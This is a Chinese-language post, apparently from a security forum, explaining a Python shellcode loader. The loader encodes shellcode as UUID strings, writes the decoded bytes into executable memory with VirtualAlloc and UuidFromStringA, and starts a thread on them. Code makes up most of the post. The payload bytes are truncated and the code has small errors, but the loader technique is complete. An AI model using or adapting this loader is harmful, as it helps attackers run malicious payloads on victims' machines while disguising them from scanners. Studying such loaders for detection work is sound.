UUID加载器
=======

前几天看到一个加载器很有意思，通过uuid方式将shellcode写入内存中

在此复现一下，虽然不免杀，但可以扩宽我们将shellcode写入内存的知识面。

UUID是啥
======

UUID: 通用唯一标识符 ( Universally Unique Identifier ), 对于所有的UUID它可以保证在空间和时间上的唯一性. 它是通过MAC地址, 时间戳, 命名空间, 随机数, 伪随机数来保证生成ID的唯一性, 有着固定的大小( 128 bit ). 它的唯一性和一致性特点使得可以无需注册过程就能够产生一个新的UUID. UUID可以被用作多种用途, 既可以用来短时间内标记一个对象, 也可以可靠的辨别网络中的持久性对象.

转换为UUID
=======

python有根据十六进制字符串生成UUID的函数uuid.UUID()

<https://docs.python.org/3/library/uuid.html>

注意16个字节转换一个uuid值，\\x00是一个字节

当剩余字节数不满16个可添加\\x00补充字节数，必须将全部的shellcode全部转化为uuid

```php
import uuid

scode = b'''\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\......'''
list = []
for i in range(len(scode)/16):
     bytes_a = scode[i*16:16+i*16]
     b = uuid.UUID(bytes_le=bytes_a)
     list.append(str(b))
print(list)
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c4ef2f6fe1b98efa51dead8d181fdef89ca5ee05.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c4ef2f6fe1b98efa51dead8d181fdef89ca5ee05.png)

UUID写入内存
========

将普通的内存加载器改了改，能用就行

主要是了解uuid写入内存的实现过程

下面已经将shellcode转为了uuid，并放在列表中

```php
import ctypes
import requests
import b ase64

shellcode = ['e48348fc-e8f0-00c8-0000-415141505251', 'd2314856-4865-528b-6048-8b5218488b52'.......]
```

申请内存，注意申请内存的大小len(shellcode)\*16

有多少uuid值，它的16倍就是需要的内存大小

```php
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode)*16, 0x1000, 0x40)
```

通过UuidFromStringA函数，将uuid值转为二进制

二进制则储存在内存当中，rwxpage1是内存指针，表示从该指针位置写入。

rwxpage1+=16是控制指针的位置，每写入一个uuid二进制需要将指针移动16个字节

```php
rwxpage1 = rwxpage
for i in list:
    ctypes.windll.Rpcrt4.UuidFromStringA(i,rwxpage1)
    rwxpage1+=16
```

然后创建线程运行即可。

```php
handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)

ctypes.windll.kernel32.WaitForSingleO bject(handle, -1)
```